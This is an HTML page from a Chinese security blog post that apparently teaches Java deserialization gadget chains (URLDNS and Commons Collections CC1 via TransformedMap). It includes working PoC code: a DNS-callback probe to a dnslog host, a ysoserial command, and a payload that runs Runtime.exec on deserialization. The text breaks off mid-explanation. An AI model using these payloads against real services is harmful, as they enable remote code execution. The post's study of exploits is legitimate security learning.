@@ -1,0 +1,1252 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">CC链学习-上 | Pp1ove</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "さくら荘そのPp1ove";
+  mashiro_option.author_name = "Pp1ove";
+  mashiro_option.site_url = "https://pp1ove.github.io/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
+  <script type="text/javascript">
+  var bg = "/img/cover/2.jpg,/img/cover/3.jpg,/img/cover/4.jpg,/img/cover/5.jpg,/img/cover/6.jpg,/img/cover/7.jpg,/img/cover/8.jpg,/img/cover/9.jpg,/img/cover/10.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+
+  </style>
+
+</head>
+</html>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://pp1ove.github.io/">
+          <img src="/img/custom/head.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>南风过境，十里春风不如你！</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="http://github.com/Pp1ove" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://space.bilibili.com/195675276" target="_blank" class="social-github" title="bilibili">
+                    <img src="/img/social/bilibili.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="/img/social/qq.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="/img/custom/qq.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">さくら荘その</span>
+            <span class="shironeko">Pp1ove</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/技术/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/复现/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          复现
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/学科/">
+                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                          学科
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/题目/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          题目
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/bangumi/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          番组
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-headphones" aria-hidden="true"></i>
+                          歌单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/图集/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          图集
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    留言板
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+                    友人帐
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/donate/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+                    赞赏
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/client/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+                    客户端
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/atom.xml">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+                    RSS
+                  </span>
+                </a>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(\img\article\1.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\1.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      CC链学习-上</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="\img\custom\head.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">Yasax1</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-7-13<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要参考P神的java漫谈,以及一些网上的资料,加上一些自己的思考。因为我也接触java没多久,文章对于和我一样的小白来说可能就比较友好。可能也会有一些理解方面的错误,欢迎师傅们指正。</p>
+<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>URLDNS是ysoserial中最简单的一条利用链,因为其如下的优点,⾮常适合我们在检测反序列化漏洞时使⽤：</p>
+<blockquote>
+<p>使⽤Java内置的类构造，对第三⽅库没有依赖</p>
+<p>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</p>
+</blockquote>
+<p>在ysoserial下生成URLDNS命令为:</p>
+<pre><code class="cmd"> java -jar .\ysoserial.jar URLDNS &quot;http://xxx.dnslog.cn&quot;
+</code></pre>
+<p>大致流程为:</p>
+<blockquote>
+<ol>
+<li><p>HashMap-&gt;readObject()</p>
+</li>
+<li><p>HashMap-&gt;hash()</p>
+</li>
+<li><p>URL-&gt;hashCode()</p>
+</li>
+<li><p>URLStreamHandler-&gt;hashCode()</p>
+</li>
+<li><p>URLStreamHandler-&gt;getHostAddress()</p>
+</li>
+<li><p>InetAddress-&gt;getByName()</p>
+</li>
+</ol>
+</blockquote>
+<p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">URLDNS.java</a></p>
+<p>关键的代码只有简简单单的四十多行</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210622211408316.png" alt="image-20210622211408316"></p>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre><code>      HashMap.readObject()
+        HashMap.putVal()
+          HashMap.hash()
+ *           URL.hashCode()
+</code></pre><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>先贴poc,大家可以一边调试一边分析</p>
+<pre><code class="java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
+public class URLDNS {
+    public static Object urldns() throws Exception{
+        //漏洞出发点 hashmap，实例化出来
+        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); //URL对象传入自己测试的dnslog
+        URL url = new URL(&quot;http://txbjb7.dnslog.cn&quot;); //反射获取 URL的hashcode方法
+        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //使用内部方法
+        f.setAccessible(true);
+        // hashMap.put时会调用hash(key),这里先把hashCode设置为其他值,避免和后面的DNS请求混淆
+        f.set(url, 0xAAA);
+        hashMap.put(url, &quot;Yasax1&quot;);
+        // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
+        f.set(url, -1);
+        // 序列化成对象，输出出来
+       return hashMap;
+    }
+    public static void main(String[] args) throws Exception {
+        payload2File(urldns(),&quot;obj&quot;);
+        payloadTest(&quot;obj&quot;);
+    }
+    public static void payload2File(Object instance, String file)
+            throws Exception {
+        //将构造好的payload序列化后写入文件中
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+    public static void payloadTest(String file) throws Exception {
+        //读取写入的payload，并进行反序列化
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
+        in.readObject();
+        in.close();
+    }
+}
+</code></pre>
+<p>首先在HashMap类中,有出发反序列化的方法readObject,找到HashMap类中的readobject方法</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713113313310.png" alt="image-20210713113313310"></p>
+<p>在readObject方法的最后一排,调用了hash方法,然后又调用了key的hashCode()方法,这里我们的key可控</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713113413603.png" alt="image-20210713113413603"></p>
+<p>接下来在<code>java.net.URL</code>类中,存在一个hashCode()方法,</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713113822978.png" alt="image-20210713113822978"></p>
+<p>这里的handler是一个URLStreamHandler 对象,跟进他的hashCode方法,不过这里我们进入handler.hashCode有一个前提,就是我们的hashCode=-1;</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713113959725.png" alt="image-20210713113959725"></p>
+<p>跟进getHostAddress方法</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713114305680.png" alt="image-20210713114305680"></p>
+<p>这里有一个InetAddress.getByName(host),获取目标ip地址,其实在网络中就是一次DNS请求.</p>
+<blockquote>
+<p>所以我们只需要new一个hashmap,然后让它的key等于一个java.net.URL对象,然后,设置这个 URL 对象的 hashCode 为初始值 -1 ,这样反序列化时将会重新计算其 hashCode ,才能触发到后⾯的DNS请求,到此我们的链子就构造完成了</p>
+</blockquote>
+<p>不过ysoserial跟我们的exp有一些不同,那是因为ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询,重写了一个SilentURLStreamHandler类,这和我们的exp中的 <code>f.set(url, 0xAAA);</code>是一样的效果</p>
+<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-上/image-20210713210801818.png" alt="image-20210713210801818"></p>
+<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。CC1指的是lazymap那条链子,但是网上也有很多关于transformedmap的分析,这里也分析一下。还有就是CC1的测试环境需要在Java 8u71以前。在此改动后，AnnotationInvocationHandler#readObject不再直接使⽤反序列化得到的Map对象，⽽是新建了⼀个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，⽽原来我们精⼼构造的Map不再执⾏set或put操作，</p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
+<li>JDK 1.7</li>
+<li>Commons Collections 3.1</li>
+</ul>
+<h1 id="transformedmap链"><a href="#transformedmap链" class="headerlink" title="transformedmap链"></a>transformedmap链</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.annotation.Target;
+import java.lang.annotation.RetentionPolicy;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+import java.lang.reflect.Method;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+public class CommonCollections11 {
+    public static Object generatePayload() throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;calc&quot; })
+        };               //这里和我上面说的有一点点不同,因为Runtime.getRuntime()没有实现Serializable接⼝,所以这里用的Runtime.class。class类实现了serializable接⼝
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innermap = new HashMap();
+        innermap.put(&quot;value&quot;, &quot;xxx&quot;);
+        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
+        //通过反射获得AnnotationInvocationHandler类对象
+        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        //通过反射获得cls的构造函数
+        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
+        //这里需要设置Accessible为true，否则序列化失败
+        ctor.setAccessible(true);
+        //通过newInstance()方法实例化对象
+        Object instance = ctor.newInstance(Retention.class, outmap);
+        return instance;
+    }
+
+    public static void main(String[] args) throws Exception {
+        payload2File(generatePayload(),&quot;obj&quot;);
+        payloadTest(&quot;obj&quot;);
+    }
+    public static void payload2File(Object instance, String file)
+            throws Exception {
+        //将构造好的payload序列化后写入文件中
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+    public static void payloadTest(String file) throws Exception {
+        //读取写入的payload，并进行反序列化
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
+        in.readObject();
+        in.close();
+    }
+}
+</code></pre>
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><pre><code>ObjectInputStream.readObject()
+            AnnotationInvocationHandler.readObject()
+                  MapEntry.setValue()
+                       TransformedMap.checkSetValue()
+                            ChainedTransformer.transform()
+                                ConstantTransformer.transform()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Class.getMethod()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.getRuntime()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.exec()
+</code></pre><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713122743898.png" alt="image-20210713122743898"></p>
+<p>这里它的构造方法为protected类型,创建对象需要通过TransformedMap.decorate()来获得一个TransformedMap实例</p>
+<pre><code class="java">Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);
+</code></pre>
+<p>在TransformedMap类中有三个方法,它会执行传入的参数的transform()方法</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210623144102886.png" alt="image-20210623144102886"></p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210623144200766.png" alt="image-20210623144200766"></p>
+<h2 id="transformer"><a href="#transformer" class="headerlink" title="transformer"></a>transformer</h2><p>transformer是一个接口,它只有一个待实现的方法</p>
+<pre><code class="java">public interface Transformer {
+    public Object transform(Object input); 
+}
+</code></pre>
+<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><img src="/2021/07/13/CC链学习-上/image-20210713121208662.png" alt="image-20210713121208662"></p>
+<p><code>ConstantTransformer</code>函数是实现<code>transformer</code>接口的一个类,在该函数里面有一个构造函数,会传入我们的<code>Object</code>,在<code>transform</code>方法中又会将该<code>Object</code>返回</p>
+<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>该类的构造方法中传入三个变量,分别是方法名,参数的类型,和参数</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713121218994.png" alt="image-20210713121218994"></p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713121226871.png" alt="image-20210713121226871"></p>
+<p>然后又会在transform方法中利用反射的知识,执行了input对象的iMethodName,但是这里有一个问题,就是transform方法中的input对象我们并不能控制,这里就要用到我们的下一个知识点</p>
+<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>该方法首先有一个构造函数,将传入的Transformer类型的数组赋值给iTransformers,这里iTransformers是一个数组</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210623145823051.png" alt="image-20210623145823051"></p>
+<p>而在该函数的transform方法中,有意思的来了</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210623150238761.png" alt="image-20210623150238761"></p>
+<p>它会将前一个transform返回的结果作为后一个对象的传参,假设我们传入的Transformer[]数组中有两个数据</p>
+<blockquote>
+<p>new ConstantTransformer(Runtime.getRuntime()) </p>
+<p>new InvokerTransformer(“exec”, new Class[]{String.class},new Object[{“calc”})</p>
+</blockquote>
+<p>这样我们就可以执行系统命令了,当然还有个前提:就是触发TransformedMap中的那三个方法,这也就是关键的地方了,这三个方法的类型都是protected,前两个由下面这两个public方法调用</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210624114200620.png" alt="image-20210624114200620"></p>
+<p>而checkSetValue则可以从注释中看到,当调用该类的setvalue方法时,会自动调用checkSetValue方法,而该类的setValue方法则继承于它的父类<code>AbstractInputCheckedMapDecorator</code></p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210624114452858.png" alt="image-20210624114452858"></p>
+<p>去它的父类看一下</p>
+<h2 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h2><p><img src="/2021/07/13/CC链学习-上/image-20210624114909650.png" alt="image-20210624114909650"></p>
+<p>这里的this.parent传入的就是TransformedMap,<strong>AbstractInputCheckedMapDecorator</strong> 的根父类实际就是 <strong>Map</strong> ，所以我们现在只需要找到一处 <strong>readObject</strong> 方法，只要它调用了 <strong>Map.setValue()</strong> 方法,即可完成整个反序列化链。(这里涉及一些多态的知识)</p>
+<p>下面，我们来看满足这个条件的 <code>AnnotationInvocationHandler</code> 类，该类属于 <strong>JDK1.7</strong> 自带</p>
+<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><img src="/2021/07/13/CC链学习-上/image-20210624115530928.png" alt="image-20210624115530928"></p>
+<p>AnnotationInvocationHandler类的readObject 方法中看到 <strong>setValue</strong> 方法的调用</p>
+<p>这里先看看它的构造函数<img src="/2021/07/13/CC链学习-上/image-20210624121218099.png" alt="image-20210624121218099"></p>
+<p>这里先直接给出两个条件：</p>
+<ol>
+<li><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 构造函数的第⼀个参数必须是</li>
+</ol>
+<p>Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X</p>
+<ol start="2">
+<li>被 <code>TransformedMap.decorate</code> 修饰的Map中必须有⼀个键名为X的元素</li>
+</ol>
+<p>所以，在Retention有⼀个⽅法，名为value；所以，为了再满⾜第⼆个条件，我需要给Map中放⼊⼀个Key是value的元素：</p>
+<pre><code>innerMap.put(&quot;value&quot;, &quot;xxxx&quot;); 
+</code></pre><p>接下来来分析一下为什么需要有一个方法名和我们key一样</p>
+<pre><code class="java">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
+        Class[] var3 = var1.getInterfaces();
+        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) {
+            this.type = var1;                   //this.type是我们传入的Annotation类型Class
+            this.memberValues = var2;            //memberValues为我们传入的map
+        } else {
+            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);
+        }
+    }
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+        var1.defaultReadObject();
+        AnnotationType var2 = null;
+
+        try {
+            var2 = AnnotationType.getInstance(this.type);  //跟进getInstance,这里先看下面的图片以及文字
+        } catch (IllegalArgumentException var9) {
+            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+        }
+
+        Map var3 = var2.memberTypes();  //这个方法返回var2.memberTypes,我们的memberTypes是一个hashmap,而且key为&quot;value&quot;
+        Iterator var4 = this.memberValues.entrySet().iterator();//memberValues为我们传入的map
+
+        while(var4.hasNext()) {
+            Entry var5 = (Entry)var4.next();     //遍历map
+            String var6 = (String)var5.getKey();//获取map的key,这里我们传入一个值为value的key,令var6=&quot;value&quot;
+            Class var7 = (Class)var3.get(var6);//在var3中找key为var6的值,如果在这里没有找到,则返回了null,所以我们需要找一个Annotation类型有方法名为我们map的key
+            if (var7 != null) {
+                Object var8 = var5.getValue();
+                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {
+                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));
+                }
+            }
+        }
+
+    }
+</code></pre>
+<h3 id="var1-getAnnotationType"><a href="#var1-getAnnotationType" class="headerlink" title="var1.getAnnotationType"></a>var1.getAnnotationType</h3><p>跟进var1.getAnnotationType方法</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210701213228123.png" alt="image-20210701213228123"></p>
+<p>这里前面两个直接过了,来到了第三步,new AnnotationType(var0),这里var0为我们传入的Annotation类型Class跟进去</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210701213729019.png" alt="image-20210701213729019"></p>
+<p>后面返回了Annotation类型的所有Methods。接着遍历的它的所有方法,这里经过了一个for循环,var6是获得的Methods,var7接着获取了方法名。然后将返回的方法名put到了memberTypes中,这里比较关键,后面会用上,现在大家就记住memberTypes是一个hashmap对象,里面的key是我们传入的Annotation类型Class的方法名字</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210701213851143.png" alt="image-20210701213851143"></p>
+<p>总结一下这一段就类似于这段代码:</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210713170527027.png" alt="image-20210713170527027"></p>
+<h2 id="java-lang-annotation-Retention"><a href="#java-lang-annotation-Retention" class="headerlink" title="java.lang.annotation.Retention"></a>java.lang.annotation.Retention</h2><p>在该类中有一个value方法</p>
+<p><img src="/2021/07/13/CC链学习-上/image-20210701214849410.png" alt="image-20210701214849410"></p>
+<p>所以我们map类再传一个</p>
